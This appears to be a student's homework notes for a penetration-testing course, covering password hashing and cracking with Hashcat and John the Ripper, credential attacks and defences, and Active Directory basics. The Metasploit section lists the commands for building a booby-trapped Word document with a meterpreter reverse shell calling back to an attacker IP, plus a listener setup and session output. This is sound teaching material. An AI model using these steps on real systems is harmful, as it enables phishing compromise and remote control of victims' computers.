# X) Summaries / Tiivistelmät

## Cracking Passwords with Hashcat

- Passwords are stored as hashes 
- **Hashing** is the process of converting data (e.g. a password) into a hash (fixed-length string), using an algorithm, such as MD5. It's a one-way function, meaning it's easy to compute a hash, but nearly impossible to reverse it back to the original data
- Although a password can’t be directly computed from its hash, it’s possible to guess it using a wordlist (list of passwords). This involves 1. Hashing each word in the list using the same algorithm, 2. Comparing the result hashes to the target hash, 3. If a match is found, the original password has been cracked.  
- **Hashcat** is a tool that uses wordlists/dictionaries to crack (password) hashes. The hash algorithm should be identified before attempting to crack a hash.
  - Command syntax: `hashcat -m [mode] '[hash]' [wordlist.txt] -o [output_file]`

- **Hashid** is a tool for identifying the hash type/algorithm (e.g. MD5). The tool shows the algorithm and the corresponding Hashcat mode number to be used with `-m`
  - Command syntax: `hashid -m [hash]`

- Note: setup & installation are detailed in task A)
  
## Crack File Password With John

- A range of files of different formats can be locked with a password to protect the contents.
- **John the Ripper** is a password-cracking tool that uses techniques like dictionary attacks to crack/recover passwords. It can be used against password protected files and supports a wide variety of file formats.

- Note: setup & installation are detailed in task B)
  
## Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials

- All systems store passwords in some form, some more securely than others. 
- Credentials are key targets for attackers to gain access to systems, and move laterally in networks after establishing initial foothold.
- **Key**: tools, techniques, and attack methods used to steal or crack credentials.

**<ins>Password storage:</ins>**
- Most systems store user credentials in a database or a text file.
- Storage mechanisms:
    - One-way hashing
        - Hash functions turn cleartext → fixed hash value (e.g., MD5, SHA-256).
        - Not reversible and not encryption.
        - The purpose of hashing is to verify the integrity of the clear text provided 
        - Salting should be used to avoid identical hashes for identical cleartext (passwords) and to make password cracking harder.
        - Example command for generating hashes on Linux: ` echo "example" | sha256sum`

- Storage vulnerabilities:
    - Password attacks are now easier due to better computing power and freely available tools.:
        - Unencrypted storage, faster GPUs and distributed computing, Weak hash algorithms, highly available dictionaries (e.g. rainbow tables)
        - Salting helps by making identical passwords result in different hashes. Linux systems typically use salted passwords. 


**<ins>Common password/credential attacks:</ins>**

- Generic attack process: Enumerate users (discover valid usernames) -> Crack passwords 

- Exploiting common weaknesses:
    - Default, reused, simple or common passwords
    - Compromised admin accounts
      
- Network-based attacks:
    - Sniffing network traffic over unsecured networks (e.g. public wifi)
    -  Man-in-the-middle (MITM) attacks against clear text protocols, encryption (ciphered protocols) or relay attacks. 
    - Compromised network devices (routers, switches, wireless APs) can leak credentials
    - Brute-force attacks with tools using dictionaries/ credential tables. Variety of tools include: Medusa, THC-Hydra, Brutus, auxiliary Metasploit modules etc.

**<ins>Password cracking tools:</ins>**
- John the ripper: 
    - Popular, multi-platform
    - Supports multiple modes of cracking: dictionary, rule-based, and brute-force attacks.
    - Can pause and resume cracking.
    - Can automutate wordlists (adds numbers, changes cases, etc.)
- Hashcat:
    - Very fast, has GPU support
    - Supports over 2000+ hashing algorithms.
    - Ideal for large-scale cracking with more powerful hardware setups.

**<ins>Defending against password attacks / Improving password security:</ins>**
- Both storage and transmission of passwords over a network should be secured.
    - Storage side defense: OS-level protection, limit access based on necessity, intrusion detection, endpoint protection, auditing
    - Transmission defense: Encryption (TLS/SSL).
      
- Use strong hashing algorithms with salts.
- Support/Use longer and stronger passwords (length > complexity).
- Enable MFA (Multi-Factor Authentication)
- Use certificate-based authentication (e.g. public-key systems).
- Don’t reuse passwords, avoid dictionary words and obvious patterns.


## Metasploit: File-Format Exploits

**File-format exploits:**
- Vulnerabilities in file readers/programs that open files (e.g., Word, PDF readers).
- Rely on user interaction: Malicious files are made to run code when a user opens them. The file can be of any format.
- Commonly used in spear-phishing attacks
- Typically very effective but the success of the attack depends on how much information can be gained about the target (reconnaissance) before implementing the attack.

**Using Metasploit for File-Format Exploits:**
1. Search for file-format exploits
    - `msf > search fileformat date:<year>`
    - Filters available file-format exploits by year
      
2. Select a module:
    - `msf > use exploit/windows/fileformat/word_mshtml_rce`
    - Loads the Word MSHTML exploit module
      
3. View and configure options
    - `msf exploit > options`
    - Examples of module & payload options:
        - `FILENAME`: Output file name (e.g., msf.docx)
        - `OBFUSCATE`: Obfuscates malicious JavaScript content 
        - `LHOST`: The listen address (Attacker’s IP for reverse connection)
        - `LPORT`: Listening port (e.g., 443)
          
4. Set the payload (reverse shell)
    - `msf  exploit > set payload windows/x64/meterpreter/reverse_tcp`
    - `msf exploit > set LHOST 10.0.1.45`
    - `msf exploit > set LPORT 443`
    - `msf exploit > exploit`
    - Creates a malicious file (e.g. msf.doc) that connects back to the attacker when opened.
    - The exported malicious file/document can be delivered to targets e.g. via email.  

**Sending payloads/ Handling the payload connection:**
- The attacker’s system should be set up to catch the connection coming from the victim’s system (set up before the target opens the malicious file)

1. Set up a multi-handler listener:
    - A tool on the attacker’s system that waits for incoming connections from exploited systems. It "catches" the reverse shell connection, allowing remote control of the victim’s system

    - `msf exploit > use exploit/multi/handler`
    - `msf exploit(handler) > set payload windows/meterpreter/reverse_tcp`
    - `msf exploit (handler) > set LHOST 10.0.1.45`
    - `msf exploit (handler) > set LPORT 443`
    - `msf exploit (handler) > exploit -j`
    - The `-j` flag runs the handler as a background job.


2. Wait for victim to open the document:
    - Once the malicious file is opened on a vulnerable system, a shell is presented to the attacker:
      
    - `[*] Sending stage (749056 bytes) to 10.0.1.12`
    - `[*] Meterpreter session 1 opened (10.0.1.45:443 -> 10.0.1.12:2718) msf exploit (handler) > sessions -i 1`
    -` [*] Starting interaction with 1.. >`
    - This gives the attacker remote control over the system.


## The Ultimate Kali Linux Book: Understanding Active Directory

- An ** Active directory (AD)** is directory service within Microsoft Windows Server. 
- ADs are used for central management of users, groups, devices and policies within a network/domain/organization. AD is common in enterprise environments.
- Understanding trust relationships and domain authentication is key to exploiting AD systems.

**Benefits of ADs:**
- Simplifies management of large organizations
- Enables centralized control using a domain controller. A **domain controller** is a Windows server with AD installed & configured, and is the central authority for network management within a windows domain environment.
    - Replaces the need for setting up local user accounts on each device separately
    - Supports centralized management for:
        - User profile management of clients & servers in the domain
        - Network information & configuration management
        - Group Policy Objects (GPOs)** to apply security settings/policies across users, groups and devices on the domain
        - Clients’ registry configurations and policies
    - Enables user login across different computers that are members of the domain (with domain user account rather than a local user account of a device).

**Key Components of an AD**
- <ins>Logical structure components</ins>
    - Define how objects are grouped/organized/managed and how trust and security boundaries are set up in the directory
      
    1. Domain
      - A collection of/ a container for a set of objects(OUs)
      - The smallest unit where policies and security settings apply centrally.
      - Acts as a security boundary within the network
      
    2. Tree
      - A set of domains in a forest arranged in a hierarchical structure / with a hierarchical relationship
      - Domains within a tree share a contiguous namespace.
      - Used to create logical security boundaries between each domain within the same forest.
      
    3. Forest
      - Highest-level/Top-level structure in AD. Represents the entire AD infrastructure.
      - Contains trees and domains that share a common configuration, schema, and global catalog
      - Defines administrative, security & trust boundaries for managing objects of an entire organization/directory infrastructure.

- <ins>Object components (stored in the AD database) </ins>
    - Active Directory stores information about ”objects” on the network
    - **Objects** are things that AD directly manages and interacts with (e.g. to assign policies)
    - **Supported objects**: Users, Groups, OUs, Computers, Printers, Shared folders 
        - Organizational Units (OUs)
            - Used to organize objects (that share a common factor) as units within the AD. 
            - Often used to group by e.g. department or role.
        - Groups
            - Used to apply policies or permissions to multiple users at once (e.g. with GPOs)

** Trust Relationships in AD **
- Trusts allows users in one domain or forest to access resources in another domain or forest. 
- A variety of domain and forest configurations are possible, allowing for different types of trust relationships/models within Active Directory.
  
- Trust types/models include:
    - **One-way trust**: Only one domain can access the other but not the other way around 
    - **Two-way trust**: Both domains can access each other 
    - **Transitive trust**: Trust can pass through/extend to connected domains within the same forest. 
    - **Non-transitive trust**: Trust does not extend to other domains. 
    - **Forest trust**: Trust between different forests.
      
- AD trust relationships can be exploited to compromise a Windows domain without exploiting security vulnerabilities within the OS. 

**Local vs. Domain Login**
- **Local login**: 
    - Credentials stored in the device's SAM file (located in the directory C:\Windows\System32\config). Username is in plaintext, password in NTLM v1 hash

- **Domain login**:
    - By default, uses an unsecure LDAP protocol to check entered credentials with the domain controller. The password is sent as NTLM v2 hash.
    - The domain controller verifies credentials and applies security policies accordingly.
    - The trust between domain clients and the domain controller using LDAP can be exploited


## References / Lähteet:
- Karvinen 2022: Cracking Passwords with Hashcat at https://terokarvinen.com/2022/cracking-passwords-with-hashcat/ 
- Karvinen 2023: Crack File Password With John at https://terokarvinen.com/2023/crack-file-password-with-john/ 
- Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials at https://learning.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00/ 
- Kennedy et al 2025: Metasploit: File-Format Exploits at https://learning.oreilly.com/library/view/metasploit-2nd-edition/9798341620032/xhtml/chapter9.xhtml#:-:text=File-Format%20Exploits 
- Singh 2025: The Ultimate Kali Linux Book: Understanding Active Directory at https://learning.oreilly.com/library/view/the-ultimate-kali/9781835085806/Text/Chapter_12.xhtml#_idParaDest-272



# A) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.
-
## References / Lähteet:


# C) Asenna John the Ripper ja testaa sen toiminta murtamalla jonkin esimerkkitiedoston salasana.
-

## References / Lähteet:


# E) Tiedosto. Tee itse tai etsi verkosta jokin salakirjoitettu tiedosto, jonka saat auki. Murra sen salaus.
- Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi

## References / Lähteet:

# F) Tiiviste. Tee itse tai etsi verkosta salasanan tiiviste, jonka saat auki. Murra sen salaus.
- Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi. Voit esim. tehdä käyttäjän Linuxiin ja murtaa sen salasanan.

## References / Lähteet:


# G) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.
- 

## References / Lähteet:


# Tehtävänanto:
- Karvinen 2025 - Tunkeutumistestaus at https://terokarvinen.com/tunkeutumistestaus/#h4-leviamassa
